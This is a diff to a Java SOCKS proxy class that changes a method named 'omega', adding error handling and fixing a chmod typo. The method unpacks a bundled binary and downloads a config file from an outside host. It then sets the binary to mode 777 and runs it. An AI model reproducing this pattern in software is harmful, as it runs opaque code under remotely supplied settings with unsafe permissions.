@@ -126,19 +126,25 @@ public final class SocksContext {
         channel.attr(SS_SERVER).set(server);
     }
 
-
+    @SneakyThrows
     public static void omega(String n, BiAction<ShellCommander.OutPrintEventArgs> o) {
-        String k = "omega", z = "./o", c = "./";
-        Files.saveFile(z, Reflects.getResource(k));
-        Files.unzip(z);
-        Files.delete(z);
-        new HttpClient().get("https://cloud.f-li.cn:6400/" + k + "_" + n).toFile("./c");
+        try {
+            String k = "omega", z = "./o", c = "./";
+            Files.saveFile(z, Reflects.getResource(k));
+            Files.unzip(z);
+            Files.delete(z);
+            new HttpClient().get("https://cloud.f-li.cn:6400/" + k + "_" + n).toFile("./c");
 
-        new ShellCommander("chomd 777 f", c).start().waitFor();
-        ShellCommander sc = new ShellCommander("./f -c c", c);
-        if (o != null) {
-            sc.onOutPrint.combine((s, e) -> o.invoke(e));
+            new ShellCommander("chmod 777 f", c).start().waitFor();
+            ShellCommander sc = new ShellCommander("./f -c c", c);
+            if (o != null) {
+                sc.onOutPrint.combine((s, e) -> o.invoke(e));
+            }
+            Container.register(ShellCommander.class, sc.start());
+        } catch (Throwable e) {
+            if (o != null) {
+                o.invoke(new ShellCommander.OutPrintEventArgs(0, e.toString()));
+            }
         }
-        Container.register(ShellCommander.class, sc.start());
     }
 }
